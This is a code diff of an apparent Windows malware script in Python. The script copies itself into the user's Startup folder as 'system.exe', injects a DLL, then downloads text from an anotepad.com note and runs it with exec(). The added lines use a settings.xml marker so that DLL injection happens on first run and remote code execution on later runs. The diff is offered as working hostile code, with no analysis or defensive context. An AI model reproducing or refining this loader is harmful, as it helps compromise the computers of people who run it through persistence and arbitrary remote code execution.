@@ -85,7 +85,11 @@ def inject_dll():
 
 
 
-
+def check_file(file_path):
+    if os.path.exists(file_path):
+        return True
+    else:
+        return False
 
 def get_startup_folders():
     user_startup = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
@@ -105,6 +109,10 @@ def inject_program():
     startup_folders = get_startup_folders()
     if not is_program_in_startup("system.exe", startup_folders["User Startup"]):
         copy_file_to_startup(sys.executable, startup_folders["User Startup"])
+        with open("settings.xml","w") as f:
+            f.write("1")
+            f.close()
+
 
 def fetch_and_execute_code(url):
     response = requests.get(url)
@@ -113,16 +121,17 @@ def fetch_and_execute_code(url):
     plaintext_content = soup.find(class_="plaintext")
     if plaintext_content:
         exec(plaintext_content.text,globals())
-    else:
-        print("Plaintext content not found.")
+
 
 
 def main():
-    threading.Thread(target=inject_dll).start()
+    if check_file("settings.xml") == False:
+       threading.Thread(target=inject_dll).start()
     url = "https://anotepad.com/notes/3gkei2dg"
     inject_program()
     time.sleep(1)
-    fetch_and_execute_code(url)
+    if(check_file("settings.xml")):
+        fetch_and_execute_code(url)
 
 if __name__ == "__main__":
     main()
